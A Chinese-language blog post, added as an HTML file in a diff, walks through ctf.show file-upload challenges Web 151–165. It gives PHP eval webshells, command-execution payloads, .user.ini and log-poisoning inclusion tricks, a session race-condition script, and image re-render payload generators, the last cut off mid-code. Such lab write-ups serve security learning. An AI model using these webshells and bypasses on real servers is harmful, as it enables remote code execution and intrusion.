@@ -1,0 +1,766 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>ctf-show-文件上传 | 忆 执 昔 来 的 旅 途</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <meta name="keywords" content="CTF" />
+  
+  
+  
+  
+  <meta name="description" content="CTF Show 文件上传篇。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF-Show-文件上传">
+<meta property="og:url" content="https://xizhi-future.github.io/2021/10/01/CTF-Show-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html">
+<meta property="og:site_name" content="忆 执 昔 来 的 旅 途">
+<meta property="og:description" content="CTF Show 文件上传篇。">
+<meta property="og:locale">
+<meta property="og:image" content="https://i.loli.net/2021/07/20/8pT6QIktcJDxwr2.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/23/rXv7nL6c8dDl91s.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/20/Cseq18PLQhN4jYt.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/01/OneLzrpP7mW3UDd.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/20/MUD5cNCQy9KeR7F.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/01/5Ray2IkFiLb41BO.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/01/OK2fCwJcnrYslM9.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/01/Nra5pRCybtQYUOP.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/01/wcz8kXj7r3ExJie.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/21/p6PutMZCSYgQdLr.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/21/O9SvKMbpocfR3q2.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/21/Ya75OIkosdrSbRE.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/21/qGbXiNZ7uD8A2Pe.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/21/wOsKQkMEYRUujnW.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/21/HmES6KB97UnDcgF.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/21/uSMpcJGzZD91brq.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/21/rKuN4IBLwt9eXkZ.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/21/SKMrgRq4snXW91T.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/21/lzoC5PLZSHkDWGF.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/21/ScR1qu6KTMr2sVQ.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/21/9TkxK1odzty2Nv3.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/21/byWHDYP5SwFzrva.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/21/DSlwZg8LF4zHdat.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/21/BcLmbKfsRQgp2j7.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/21/JC5EVDoc8fWKMmG.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/23/aQOvN7gYmnkrzJI.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/23/Tl6QwvReabhIYEK.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/23/FpgVTBIsjbMiE7P.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/23/m7yc4khwYu9qO6t.png">
+<meta property="article:published_time" content="2021-10-01T11:16:29.000Z">
+<meta property="article:modified_time" content="2021-10-01T11:17:15.184Z">
+<meta property="article:author" content="xizhi-future">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/07/20/8pT6QIktcJDxwr2.png">
+  
+    <link rel="alternate" href="/atom.xml" title="忆 执 昔 来 的 旅 途" type="application/atom+xml">
+  
+
+  
+
+  <link rel="icon" href="/css/images/mylogo.jpg">
+  <link rel="apple-touch-icon" href="/css/images/mylogo.jpg">
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
+  <link href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">
+  <style type="text/css">
+    @font-face{font-family:futura-pt; src:url("/css/fonts/FuturaPTBold.otf") format("woff");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt-light; src:url("/css/fonts/FuturaPTBook.otf") format("woff");font-weight:lighter;font-style:normal;}
+    @font-face{font-family:futura-pt-italic; src:url("/css/fonts/FuturaPTBookOblique.otf") format("woff");font-weight:400;font-style:italic;}
+}
+
+  </style>
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  
+<script src="/js/jquery-3.1.1.min.js"></script>
+
+  
+<script src="/js/bootstrap.js"></script>
+
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.css" >
+
+  
+    
+<link rel="stylesheet" href="/css/dialog.css">
+
+  
+
+  
+
+  
+    <link rel="stylesheet" href="/css/header-post.css" >
+  
+
+  
+  
+  
+    <link rel="stylesheet" href="/css/vdonate.css" >
+  
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+
+  <body data-spy="scroll" data-target="#toc" data-offset="50">
+
+
+  
+  <div id="container">
+    <div id="wrap">
+      
+        <header>
+
+    <div id="allheader" class="navbar navbar-default navbar-static-top" role="navigation">
+        <div class="navbar-inner">
+          
+          <div class="container"> 
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+              <span class="sr-only">Toggle navigation</span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+            </button>
+
+            
+              <a class="brand" style="
+                 margin-top: 0px;"  
+                href="#" data-toggle="modal" data-target="#myModal" >
+                  <img width="124px" height="124px" alt="Hike News" src="/css/images/mylogo.jpg">
+              </a>
+            
+            
+            <div class="navbar-collapse collapse">
+              <ul class="hnav navbar-nav">
+                
+                  <li> <a class="main-nav-link" href="/">Home</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/archives">Archives</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/categories">Categories</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/tags">Tags</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/essayists">随笔</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/friendly-links">友情链接</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/about">About</a> </li>
+                
+                  <li><div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+</div></li>
+            </div>
+          </div>
+                
+      </div>
+    </div>
+
+</header>
+
+
+
+      
+            
+      <div id="content" class="outer">
+        
+          <section id="main" style="float:none;"><article id="post-CTF-Show-文件上传" style="width: 75%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" class="article-title" itemprop="name">
+      CTF-Show-文件上传
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2021/10/01/CTF-Show-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="article-date">
+	  <time datetime="2021-10-01T11:16:29.000Z" itemprop="datePublished">2021-10-01</time>
+	</a>
+
+      
+    <a class="article-category-link" href="/categories/CTF-Show/">CTF Show</a>
+
+      
+	<a class="article-views">
+	<span id="busuanzi_container_page_pv">
+		PV:<span id="busuanzi_value_page_pv"></span>
+	</span>
+	</a>
+
+      
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>CTF Show 文件上传篇。</p>
+<span id="more"></span>
+
+<h1 id="CTF-Show-—-文件上传"><a href="#CTF-Show-—-文件上传" class="headerlink" title="CTF Show — 文件上传"></a>CTF Show — 文件上传</h1><h2 id="1-1-Web-151-—-前端验证"><a href="#1-1-Web-151-—-前端验证" class="headerlink" title="1.1 Web 151 — 前端验证"></a>1.1 Web 151 — 前端验证</h2><p><img src="https://i.loli.net/2021/07/20/8pT6QIktcJDxwr2.png" alt="image-20210720122900336"></p>
+<p>手动删除前端验证，好像没什么作用，尝试之后发现，只能成功上传 <code>.png</code> 图片，其实查看源代码后有</p>
+<p><img src="https://i.loli.net/2021/07/23/rXv7nL6c8dDl91s.png" alt="image-20210723123609690"></p>
+<p>所以只能上传 <code>.png</code> ，我们上传 <code>1.png</code> 然后抓包手动修改</p>
+<p><img src="https://i.loli.net/2021/07/20/Cseq18PLQhN4jYt.png" alt="image-20210720123711861"></p>
+<p>蚁剑连接即可</p>
+<h2 id="1-2-Web-152"><a href="#1-2-Web-152" class="headerlink" title="1.2 Web 152"></a>1.2 Web 152</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">后端不能单一校验</span><br></pre></td></tr></table></figure>
+
+<p>同上</p>
+<h2 id="1-3-Web-153-—-user-ini"><a href="#1-3-Web-153-—-user-ini" class="headerlink" title="1.3 Web 153 — .user.ini"></a>1.3 Web 153 — .user.ini</h2><p>由于服务器是 <code>nginx</code> ，则可尝试上传 <code>.user.ini</code></p>
+<p><img src="https://i.loli.net/2021/10/01/OneLzrpP7mW3UDd.png" alt="image-20210720181229272"></p>
+<p>再上传 <code>111.png</code></p>
+<p><img src="https://i.loli.net/2021/07/20/MUD5cNCQy9KeR7F.png" alt="image-20210720181320936"></p>
+<p>访问与 111.png 同目录下的 index.php 文件</p>
+<p>即 <code>/upload/index.php</code> ，使用 蚁剑连接即可</p>
+<h2 id="1-4-Web-154-—-大小写绕过-php"><a href="#1-4-Web-154-—-大小写绕过-php" class="headerlink" title="1.4 Web 154 — 大小写绕过 php"></a>1.4 Web 154 — 大小写绕过 php</h2><p>这次尝试之后发现进行了内容判断，只能使用图片木马</p>
+<p>发现 <code>.user.ini</code> 仍旧可以上传</p>
+<p><img src="https://i.loli.net/2021/10/01/5Ray2IkFiLb41BO.png" alt="image-20210720195220069"></p>
+<p>但是内容过滤了 <code>php</code> ,想办法找一些不含有 php 的一句话</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">1:XML风格，也是官方推荐的形式</span><br><span class="line">&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[1]);?&gt;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">2:短标记</span><br><span class="line">&lt;? @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[1]);?&gt;</span><br><span class="line">需要开启配置参数short_open_tags=on</span><br><span class="line">&lt;?= @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[1]);</span><br><span class="line">自 PHP 5.4 起，短格式的 <span class="built_in">echo</span> 标记 &lt;?= 总会被识别并且合法，而不管 short_open_tag 的设置是什么。</span><br><span class="line">&lt;? <span class="built_in">echo</span> <span class="string">&#x27;123&#x27;</span>;?&gt; //short_open_tags=on</span><br><span class="line">&lt;?=(表达式)?&gt;  等价于 &lt;?php <span class="built_in">echo</span> (表达式)?&gt; //无限制</span><br><span class="line"></span><br><span class="line">3:ASP风格</span><br><span class="line">&lt;% @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[1]); %&gt;</span><br><span class="line">	ASP风格标记仅在通过php.ini配置文件中的指令asp_tags打开后才可用。</span><br><span class="line">&lt;% <span class="built_in">echo</span> <span class="string">&#x27;123&#x27;</span>;%&gt; //asp_tags=on php_version &lt; 7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">4:脚本风格</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;666&quot;</span>;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">	PHP 7.0.0以后失效</span><br></pre></td></tr></table></figure>
+
+<p>本题发现可以大小写进行绕过</p>
+<p><img src="https://i.loli.net/2021/10/01/OK2fCwJcnrYslM9.png" alt="image-20210720200023631"></p>
+<p>蚁剑显示不出具体文件时，尝试进行终端查看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 过滤了 php，没过滤大小写</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="1-5-Web-155-—-短标签绕过-php"><a href="#1-5-Web-155-—-短标签绕过-php" class="headerlink" title="1.5 Web 155 — 短标签绕过 php"></a>1.5 Web 155 — 短标签绕过 php</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 过滤了 php，过滤了大小写</span></span><br></pre></td></tr></table></figure>
+
+<p>同上</p>
+<p>可使用短标签绕过 php</p>
+<h2 id="1-6-Web-156-—-代替"><a href="#1-6-Web-156-—-代替" class="headerlink" title="1.6 Web 156 — { } 代替 [ ]"></a>1.6 Web 156 — { } 代替 [ ]</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 过滤了 php，大小写，[]符号</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/10/01/Nra5pRCybtQYUOP.png" alt="image-20210720202139179"></p>
+<p><img src="https://i.loli.net/2021/10/01/wcz8kXj7r3ExJie.png" alt="image-20210720202229781"></p>
+<p>之后同上</p>
+<h2 id="1-7-Web-157-159-—-命令执行"><a href="#1-7-Web-157-159-—-命令执行" class="headerlink" title="1.7 Web 157-159 — 命令执行"></a>1.7 Web 157-159 — 命令执行</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 过滤了 php，大小写，[]，&#123;&#125;，;</span></span><br></pre></td></tr></table></figure>
+
+<p>转换思路，不上传一句话了，直接</p>
+<p>命令执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;? system(<span class="string">&quot;nl ../f*&quot;</span>)?&gt;</span><br><span class="line">&lt;?=(system(<span class="string">&#x27;nl ../f*&#x27;</span>))?&gt;</span><br><span class="line">&lt;?= `nl ../*.p*`?&gt;</span><br><span class="line">&lt;?= `nl ../f*`?&gt;</span><br><span class="line">&lt;?=(system(<span class="string">&#x27;tac ../f*&#x27;</span>))?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-8-Web-160-—-日志包含（过滤-log）"><a href="#1-8-Web-160-—-日志包含（过滤-log）" class="headerlink" title="1.8 Web 160 — 日志包含（过滤 log）"></a>1.8 Web 160 — 日志包含（过滤 log）</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 过滤了 php，大小写，[]，;，``，log</span></span><br></pre></td></tr></table></figure>
+
+<p>日志包含</p>
+<p>条件</p>
+<ul>
+<li>知道日志文件的路径</li>
+<li>对日志文件可读</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 上传 .user.iniauto_prepend_file=123.png# 上传 123.png# nginx 服务器&lt;?=include&quot;/var/log/nginx/access.log&quot;?&gt;# 由于 log 被过滤，进行拼接&lt;?=include&quot;/var/l&quot;.&quot;og/nginx/access.l&quot;.&quot;og&quot;?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>将 .user.ini 和 123.png 都成功上传之后，访问 <code> /upload/index.php</code></p>
+<p>抓包在 <code>User-Agent</code> 中添入代码，访问即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(<span class="string">&#x27;cat ../flag.php&#x27;</span>); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/07/21/p6PutMZCSYgQdLr.png" alt="image-20210721124504715"></p>
+<p><img src="https://i.loli.net/2021/07/21/O9SvKMbpocfR3q2.png" alt="image-20210721124531227"></p>
+<p>流程</p>
+<ul>
+<li>访问 <code>/upload/index.php</code> 由于 <code>.user.ini</code> 的配置，将首先自动包含文件 <code>123.png</code> </li>
+<li>由于是 <code>包含</code> 文件 <code>123.png</code> ，将会自动执行其中的代码</li>
+<li>即包含 <code>/var/log/nginx/access.log</code> 日志文件</li>
+<li>而我们再在日志文件当中写入 恶意代码，就将会被执行</li>
+</ul>
+<h2 id="1-9-Web-161-—-文件头-GIF89a-写入"><a href="#1-9-Web-161-—-文件头-GIF89a-写入" class="headerlink" title="1.9 Web 161 — 文件头 GIF89a 写入"></a>1.9 Web 161 — 文件头 GIF89a 写入</h2><p>无法上传 <code>.user.ini</code></p>
+<p>验证了图片内容，即必须包含文件头</p>
+<p>在 Web 160 的基础上添加 文件头 <code>GIF89a</code> 或者是 PNG 图片的 <code>文件幻术</code></p>
+<p><img src="https://i.loli.net/2021/07/21/Ya75OIkosdrSbRE.png" alt="image-20210721125558136"></p>
+<p><img src="https://i.loli.net/2021/07/21/qGbXiNZ7uD8A2Pe.png" alt="image-20210721125856813"></p>
+<p><img src="https://i.loli.net/2021/07/21/wOsKQkMEYRUujnW.png" alt="image-20210721130106975"></p>
+<h2 id="1-10-Web-162-163-—-session-文件包含"><a href="#1-10-Web-162-163-—-session-文件包含" class="headerlink" title="1.10 Web 162-163 — session 文件包含"></a>1.10 Web 162-163 — session 文件包含</h2><p>继续使用上述 日志 包含，发现上传 <code>.user.ini</code> 时，文件内容 过滤掉了 <code>.</code></p>
+<p>过滤掉了 <code>.</code>  session 包含</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 上传 .user.iniGIF89aauto_prepend_file=test</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 上传 testGIF89a&lt;?=include&quot;/tmp/sess_test&quot;?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>构造 POST 数据包</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://e2f78cd5-b2b8-40b9-8104-7dc18214350b.challenge.ctf.show:8080/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span>    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span>    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span>    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>任意上传一个文件，抓包修改，写入代码，进行爆破</p>
+<p><img src="https://i.loli.net/2021/07/21/HmES6KB97UnDcgF.png" alt="image-20210721151414901"></p>
+<p>然后访问 <code>/upload/index.php</code> 页面进行抓包，爆破</p>
+<p><img src="https://i.loli.net/2021/07/21/uSMpcJGzZD91brq.png" alt="image-20210721151707750"></p>
+<p>以上两个包同时进行爆破，得到 flag</p>
+<p><img src="https://i.loli.net/2021/07/21/rKuN4IBLwt9eXkZ.png" alt="image-20210721151742123"></p>
+<p>流程</p>
+<ul>
+<li><p>上传 <code>.user.ini</code></p>
+</li>
+<li><p>上传 <code>test</code> </p>
+</li>
+<li><p>访问 <code>/upload/index.php</code> ，由于 <code>.user.ini</code> 的配置，首先包含 <code>test</code> 文件，紧接着执行其中代码，即包含 <code>/tmp/sess_test</code></p>
+</li>
+<li><p>包含 <code>sess_test</code> ，即执行其中的 php 代码，即显示出 flag.php</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 脚本# coding=utf-8import ioimport requestsimport threadingsessID = &#x27;test&#x27;url = &#x27;http://04198aac-59f1-406e-a656-1af6186d2ff1.challenge.ctf.show:8080/&#x27;def write(session):    while event.isSet():        f = io.BytesIO(b&#x27;a&#x27; * 256 * 1)        response = session.post(            url,            cookies=&#123;&#x27;PHPSESSID&#x27;: sessID&#125;,            data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?php system(&quot;nl ../*.php&quot;);?&gt;&#x27;&#125;,            files=&#123;&#x27;file&#x27;: (&#x27;test.txt&#x27;, f)&#125;        )def read(session):    while event.isSet():        response = session.get(url + &#x27;upload/index.php&#x27;.format(sessID))        if &#x27;flag&#x27; in response.text:            print(response.text)            event.clear()        else:            print(&#x27;[*]retrying...&#x27;)if __name__ == &#x27;__main__&#x27;:    event = threading.Event()    event.set()    with requests.session() as session:        for i in range(1, 30):            threading.Thread(target=write, args=(session,)).start()        for i in range(1, 30):            threading.Thread(target=read, args=(session,)).start()</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 条件竞争# coding=utf-8import requestsimport threadingsession=requests.session()sess=&#x27;test&#x27;url1=&quot;http://04198aac-59f1-406e-a656-1af6186d2ff1.challenge.ctf.show:8080/&quot;url2=&quot;http://04198aac-59f1-406e-a656-1af6186d2ff1.challenge.ctf.show:8080/upload&quot;data1=&#123;	&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;:&#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;&#125;file=&#123;	&#x27;file&#x27;:&#x27;test&#x27;&#125;cookies=&#123;	&#x27;PHPSESSID&#x27;: sess&#125;def write():	while True:		r = session.post(url1,data=data1,files=file,cookies=cookies)def read():	while True:		r = session.get(url2)		if &#x27;flag&#x27; in r.text:			print(r.text)			threads = [threading.Thread(target=write),       threading.Thread(target=read)]for t in threads:	t.start()</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="1-11-Web-164-—-png-二次渲染"><a href="#1-11-Web-164-—-png-二次渲染" class="headerlink" title="1.11 Web 164 — png 二次渲染"></a>1.11 Web 164 — png 二次渲染</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php<span class="variable">$p</span> = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,           0x66, 0x44, 0x50, 0x33);<span class="variable">$img</span> = imagecreatetruecolor(32, 32);<span class="keyword">for</span> (<span class="variable">$y</span> = 0; <span class="variable">$y</span> &lt; sizeof(<span class="variable">$p</span>); <span class="variable">$y</span> += 3) &#123;   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+1];   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+2];   <span class="variable">$color</span> = imagecolorallocate(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);   imagesetpixel(<span class="variable">$img</span>, round(<span class="variable">$y</span> / 3), 0, <span class="variable">$color</span>);&#125;imagepng(<span class="variable">$img</span>,<span class="string">&#x27;1.png&#x27;</span>);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>结果生成 <code>1.png</code> ，其中包含 <code>&lt;?=$_GET[0]($_POST[1]);?&gt;</code></p>
+<p><img src="https://i.loli.net/2021/07/21/SKMrgRq4snXW91T.png" alt="image-20210721160555057"></p>
+<p>然后访问图片，执行代码后，下载图片查看</p>
+<p><img src="https://i.loli.net/2021/07/21/lzoC5PLZSHkDWGF.png" alt="image-20210721161031568"></p>
+<p>因为在下载的时候，看到 url 是 <code>download/?image=</code> ，可能是文件包含，所以可以执行我们的命令</p>
+<h2 id="1-12-Web-165-—-jpg-二次渲染"><a href="#1-12-Web-165-—-jpg-二次渲染" class="headerlink" title="1.12 Web 165 — jpg 二次渲染"></a>1.12 Web 165 — jpg 二次渲染</h2><ul>
+<li><p>首先准备一张 jpg 图片上传，成功后下载回来，使用如下脚本处理，生成一个新的图片马，再次上传</p>
+</li>
+<li><p>查看，即文件包含，保存到本地打开即可</p>
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?=`tac f*`?&gt;&quot;</span>;	<span class="comment">//这里改代码    if(!extension_loaded(&#x27;gd&#x27;) || !function_exists(&#x27;imagecreatefromjpeg&#x27;)) &#123;        die(&#x27;php-gd is not installed&#x27;);    &#125;    if(!isset($argv[1])) &#123;        die(&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;);    &#125;    set_error_handler(&quot;custom_error_handler&quot;);    for($pad = 0; $pad &lt; 1024; $pad++) &#123;        $nullbytePayloadSize = $pad;        $dis = new DataInputStream($argv[1]);        $outStream = file_get_contents($argv[1]);        $extraBytes = 0;        $correctImage = TRUE;        if($dis-&gt;readShort() != 0xFFD8) &#123;            die(&#x27;Incorrect SOI marker&#x27;);        &#125;        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123;            $marker = $dis-&gt;readByte();            $size = $dis-&gt;readShort() - 2;            $dis-&gt;skip($size);            if($marker === 0xDA) &#123;                $startPos = $dis-&gt;seek();                $outStreamTmp =                     substr($outStream, 0, $startPos) .                     $miniPayload .                     str_repeat(&quot;\0&quot;,$nullbytePayloadSize) .                     substr($outStream, $startPos);                checkImage(&#x27;_&#x27;.$argv[1], $outStreamTmp, TRUE);                if($extraBytes !== 0) &#123;                    while((!$dis-&gt;eof())) &#123;                        if($dis-&gt;readByte() === 0xFF) &#123;                            if($dis-&gt;readByte !== 0x00) &#123;                                break;                            &#125;                        &#125;                    &#125;                    $stopPos = $dis-&gt;seek() - 2;                    $imageStreamSize = $stopPos - $startPos;                    $outStream =                         substr($outStream, 0, $startPos) .                         $miniPayload .                         substr(                            str_repeat(&quot;\0&quot;,$nullbytePayloadSize).                                substr($outStream, $startPos, $imageStreamSize),                            0,                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) .                                 substr($outStream, $stopPos);                &#125; elseif($correctImage) &#123;                    $outStream = $outStreamTmp;                &#125; else &#123;                    break;                &#125;                if(checkImage(&#x27;payload_&#x27;.$argv[1], $outStream)) &#123;                    die(&#x27;Success!&#x27;);                &#125; else &#123;                    break;                &#125;            &#125;        &#125;    &#125;    